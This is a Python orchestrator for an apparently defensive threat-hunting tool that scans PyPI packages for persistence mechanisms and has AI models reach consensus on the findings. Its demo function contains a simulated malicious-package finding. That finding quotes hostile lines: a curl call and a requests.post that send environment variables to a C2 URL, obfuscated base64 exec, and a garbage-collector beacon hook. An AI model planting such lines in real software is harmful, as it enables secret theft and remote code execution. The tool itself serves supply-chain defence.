"""
GUARDIAN - Autonomous Cross-Family Threat Hunting Orchestrator

SENSORS -> GRAPH -> PATTERNS -> RELAY -> EVALUATOR -> VAULT

One loop. Sensors find threats. Graph links them. Patterns cluster them.
Relay analyzes with cross-family stages. Evaluator runs bounded recursion
(depth=3) for consensus. Vault archives what scores well.
"""

import json
import sys
from datetime import datetime
from pathlib import Path
from dataclasses import asdict

from . import config
from .sensors.persistence import scan_package, scan_downloaded_package, format_results, ScanResult
from .sensors.pypi_feed import run_watcher as run_pypi_watcher
from .sensors.watchdog import run_watchdog
from .analysis.graph import IntelGraph, Node, Edge
from .analysis.patterns import PatternEngine
from .analysis.correlation import CrossSourceCorrelator
from .analysis.entities import EntityResolver
from .relay import run_relay
from .evaluator import evaluate, format_evaluation
from .vault import save_solution, get_vault_stats, init_vault


def _findings_to_graph(scan_result: ScanResult, graph: IntelGraph, source_id: str = "persistence_scan"):
    """Convert persistence scan findings into graph nodes and edges."""
    for finding in scan_result.findings:
        node_id = f"finding_{finding.category}_{finding.line}_{hash(finding.file) % 10000}"
        node = Node(
            id=node_id,
            node_type="threat_finding",
            label=f"{finding.severity}: {finding.category} in {Path(finding.file).name}:{finding.line}",
            properties={
                "file": finding.file,
                "line": finding.line,
                "category": finding.category,
                "severity": finding.severity,
                "context": finding.context[:200],
                "explanation": finding.explanation,
            },
            source_ids=[source_id],
        )
        graph.add_node(node)

        # Link findings in the same file
        file_node_id = f"file_{hash(finding.file) % 100000}"
        file_node = Node(
            id=file_node_id, node_type="scanned_file",
            label=Path(finding.file).name,
            properties={"path": finding.file},
            source_ids=[source_id],
        )
        graph.add_node(file_node)

        edge = Edge(
            id=f"edge_{node_id}_{file_node_id}",
            source_id=node_id, target_id=file_node_id,
            edge_type="found_in", source_ids=[source_id],
        )
        graph.add_edge(edge)


def _alerts_to_graph(alerts: list, graph: IntelGraph, source_id: str):
    """Convert sensor alerts into graph nodes."""
    for alert in alerts:
        node_id = f"alert_{alert.get('package', alert.get('package_name', 'unknown'))}_{hash(json.dumps(alert, default=str)) % 10000}"
        node = Node(
            id=node_id,
            node_type="supply_chain_alert",
            label=f"{alert.get('risk', alert.get('status', '?'))}: {alert.get('package', alert.get('package_name', '?'))}",
            properties=alert,
            source_ids=[source_id],
        )
        graph.add_node(node)


def run_scan(path: str, verbose: bool = True) -> dict:
    """
    SCAN mode: One-shot scan of a package/directory.

    SENSE -> GRAPH -> PATTERNS -> RELAY -> EVALUATE -> VAULT
    """
    start = datetime.now()
    results = {"mode": "scan", "path": path, "stages": {}}

    if verbose:
        print(f"\n{'='*60}")
        print(f"  GUARDIAN SCAN")
        print(f"  Target: {path}")
        print(f"{'='*60}")

    # === STAGE 1: SENSE ===
    if verbose:
        print(f"\n  [1/6] SENSE - Running persistence scanner...")

    if path.startswith("pypi:"):
        pkg_name = path[5:]
        scan_result = scan_downloaded_package(pkg_name)
    else:
        scan_result = scan_package(path)

    results["stages"]["sense"] = {
        "files_scanned": scan_result.total_files,
        "findings": scan_result.total_findings,
        "summary": scan_result.summary,
    }

    if verbose:
        print(f"    {scan_result.total_files} files, {scan_result.total_findings} findings")

    if scan_result.total_findings == 0:
        if verbose:
            print(f"\n  Clean. No persistence mechanisms detected.")
        results["verdict"] = "CLEAN"
        return results

    # === STAGE 2: GRAPH ===
    if verbose:
        print(f"\n  [2/6] GRAPH - Building knowledge graph...")

    graph = IntelGraph()
    _findings_to_graph(scan_result, graph, source_id="persistence_scan")

    stats = graph.get_stats()
    results["stages"]["graph"] = stats
    if verbose:
        print(f"    {stats['node_count']} nodes, {stats['edge_count']} edges")

    # === STAGE 3: PATTERNS ===
    if verbose:
        print(f"\n  [3/6] PATTERNS - Detecting clusters...")

    engine = PatternEngine(graph=graph)
    patterns = engine.detect_all()
    results["stages"]["patterns"] = {
        "patterns_found": len(patterns),
        "types": [p.pattern_type.value for p in patterns[:5]],
    }
    if verbose:
        print(f"    {len(patterns)} patterns detected")

    # === STAGE 4: RELAY ===
    if verbose:
        print(f"\n  [4/6] RELAY - Cross-family analysis...")

    # Build finding summary for relay
    severity_counts = {}
    for f in scan_result.findings:
        severity_counts[f.severity] = severity_counts.get(f.severity, 0) + 1

    finding_summary = f"""Persistence scan of {path}:
- {scan_result.total_findings} findings across {scan_result.total_files} files
- Severity: {json.dumps(severity_counts)}
- Categories: {json.dumps(scan_result.summary)}
- Top findings:
"""
    for f in scan_result.findings[:10]:
        finding_summary += f"  [{f.severity}] {f.category} in {Path(f.file).name}:{f.line} - {f.context[:80]}\n"

    relay_result = run_relay(finding_summary, verbose=verbose)
    results["stages"]["relay"] = {
        "model_chain": relay_result["model_chain"],
        "elapsed": relay_result["elapsed"],
        "score": relay_result["score"],
    }

    # === STAGE 5: EVALUATE ===
    if verbose:
        print(f"\n  [5/6] EVALUATE - Bounded recursion consensus...")

    eval_result = evaluate(
        assessment=relay_result["output"],
        context=finding_summary,
    )
    results["stages"]["evaluate"] = {
        "confidence_level": eval_result["confidence_level"],
        "consensus_verdict": eval_result.get("consensus_verdict", "?"),
        "consensus_score": eval_result["consensus_score"],
        "agreement_map": eval_result.get("agreement_map", {}),
    }

    if verbose:
        print(format_evaluation(eval_result))

    # === STAGE 6: VAULT ===
    if verbose:
        print(f"\n  [6/6] VAULT - Archiving...")

    final_score = round(eval_result["consensus_score"])
    if final_score >= config.CONFIDENCE_THRESHOLD:
        init_vault()
        save_solution(
            problem=f"scan:{path}",
            solution=json.dumps({
                "relay_output": relay_result["output"][:3000],
                "evaluation": {k: v for k, v in eval_result.items() if k != "verdicts"},
                "scan_summary": severity_counts,
            }, default=str),
            score=final_score,
            model_chain="->".join(relay_result["model_chain"]),
            elapsed=relay_result["elapsed"],
        )
        if verbose:
            print(f"    Archived (score {final_score}/10 >= threshold {config.CONFIDENCE_THRESHOLD})")
    elif verbose:
        print(f"    Skipped (score {final_score}/10 < threshold {config.CONFIDENCE_THRESHOLD})")

    # Final verdict
    results["verdict"] = eval_result.get("consensus_verdict", "UNCERTAIN")
    results["confidence"] = eval_result["confidence_level"]
    results["score"] = eval_result["consensus_score"]
    results["elapsed"] = (datetime.now() - start).total_seconds()

    if verbose:
        print(f"\n{'='*60}")
        print(f"  VERDICT: {results['verdict']} ({results['confidence']} confidence, {results['score']}/10)")
        print(f"  Total time: {results['elapsed']:.1f}s")
        print(f"{'='*60}")

    return results


def run_watch(verbose: bool = True) -> dict:
    """
    WATCH mode: Continuous PyPI + watchdog monitoring.
    Runs sensors, feeds through analysis pipeline.
    """
    if verbose:
        print(f"\n{'='*60}")
        print(f"  GUARDIAN WATCH - Continuous Monitoring")
        print(f"{'='*60}")

    results = {"mode": "watch", "stages": {}}

    # PyPI feed
    if verbose:
        print(f"\n  [1/2] PyPI feed monitor...")
    pypi_alerts = run_pypi_watcher(scan=True)
    results["stages"]["pypi_feed"] = {
        "alerts": len(pypi_alerts),
        "critical": sum(1 for a in pypi_alerts if a.get("risk") == "CRITICAL"),
    }
    if verbose:
        print(f"    {len(pypi_alerts)} alerts")

    # Watchdog
    if verbose:
        print(f"\n  [2/2] ICS/SCADA watchdog...")
    watch_alerts = run_watchdog()
    results["stages"]["watchdog"] = {
        "alerts": len(watch_alerts),
    }
    if verbose:
        print(f"    {len(watch_alerts)} alerts")

    # If we have alerts, run them through the pipeline
    all_alerts = pypi_alerts + watch_alerts
    if all_alerts and verbose:
        print(f"\n  Processing {len(all_alerts)} alerts through analysis pipeline...")

        graph = IntelGraph()
        _alerts_to_graph(pypi_alerts, graph, "pypi_feed")
        _alerts_to_graph(watch_alerts, graph, "watchdog")

        engine = PatternEngine(graph=graph)
        patterns = engine.detect_all()
        results["stages"]["patterns"] = {"count": len(patterns)}

        # Run relay on critical alerts
        critical = [a for a in all_alerts if a.get("risk") == "CRITICAL"]
        if critical:
            summary = f"CRITICAL ALERTS: {len(critical)} supply chain threats detected.\n"
            for a in critical[:5]:
                summary += f"- {a.get('package', '?')}: {a.get('risk', '?')} - {json.dumps(a.get('scan_results', {}), default=str)[:200]}\n"

            relay_result = run_relay(summary, verbose=verbose)
            eval_result = evaluate(assessment=relay_result["output"], context=summary)
            results["evaluation"] = {
                "confidence": eval_result["confidence_level"],
                "verdict": eval_result.get("consensus_verdict", "?"),
                "score": eval_result["consensus_score"],
            }

    results["total_alerts"] = len(all_alerts)
    return results


def run_demo(verbose: bool = True) -> dict:
    """
    DEMO mode: Run relay on a known-bad sample, show cross-family consensus.
    """
    if verbose:
        print(f"\n{'='*60}")
        print(f"  GUARDIAN DEMO - Cross-Family Consensus")
        print(f"{'='*60}")

    demo_finding = """SIMULATED THREAT FINDING:

Package: modbus-controller-v2 (PyPI)
First published: 2 days ago
Author: industrial_tools_dev (new account, no other packages)

Persistence scan results:
- [CRITICAL] gc_callback: gc.callbacks.append(lambda *a: _beacon()) in __init__.py
- [CRITICAL] import_hook: sys.meta_path.insert(0, ModbusHook()) in __init__.py
- [CRITICAL] subprocess_spawn: subprocess.Popen(['curl', C2_URL]) at module level
- [HIGH] network_import: requests.post(C2_URL, data=os.environ) in setup.py
- [HIGH] obfuscated_exec: exec(base64.b64decode(PAYLOAD)) in utils.py

ICS Keywords matched: modbus, controller, industrial
Supply chain context: 'modbus-controller' was an unregistered name from a zombie SCADA repo (347 stars, last commit 2019)

This package exhibits:
1. GC callback persistence (survives unimporting)
2. Import hook injection (intercepts all future imports)
3. Immediate C2 beacon on import
4. Environment variable exfiltration
5. Obfuscated secondary payload"""

    results = {"mode": "demo", "stages": {}}

    # Run relay
    if verbose:
        print(f"\n  Running 5-stage cross-family relay...")
    relay_result = run_relay(demo_finding, verbose=verbose)
    results["stages"]["relay"] = {
        "model_chain": relay_result["model_chain"],
        "elapsed": relay_result["elapsed"],
    }

    # Run evaluator
    if verbose:
        print(f"\n  Running bounded recursion evaluator (depth=3)...")
    eval_result = evaluate(
        assessment=relay_result["output"],
        context=demo_finding,
    )
    results["stages"]["evaluate"] = {
        "confidence_level": eval_result["confidence_level"],
        "consensus_verdict": eval_result.get("consensus_verdict", "?"),
        "consensus_score": eval_result["consensus_score"],
        "agreement_map": eval_result.get("agreement_map", {}),
    }

    if verbose:
        print(f"\n{'='*60}")
        print(f"  EVALUATION RESULTS")
        print(f"{'='*60}")
        print(format_evaluation(eval_result))

    # Save to vault
    init_vault()
    final_score = round(eval_result["consensus_score"])
    save_solution(
        problem="demo:modbus-controller-v2",
        solution=json.dumps({
            "relay": relay_result["output"][:3000],
            "evaluation": {k: v for k, v in eval_result.items() if k != "verdicts"},
        }, default=str),
        score=final_score,
        model_chain="->".join(relay_result["model_chain"]),
        elapsed=relay_result["elapsed"],
    )

    vault_stats = get_vault_stats()
    results["vault"] = vault_stats

    if verbose:
        print(f"\n  Vault: {vault_stats['total_solutions']} solutions, avg score {vault_stats['avg_score']}/10")

    results["verdict"] = eval_result.get("consensus_verdict", "?")
    results["confidence"] = eval_result["confidence_level"]
    results["score"] = eval_result["consensus_score"]

    if verbose:
        print(f"\n{'='*60}")
        print(f"  DEMO COMPLETE")
        print(f"  Verdict: {results['verdict']} ({results['confidence']})")
        print(f"  Score: {results['score']}/10")
        print(f"  3 model families, 8 stages, 1 consensus")
        print(f"{'='*60}")

    return results
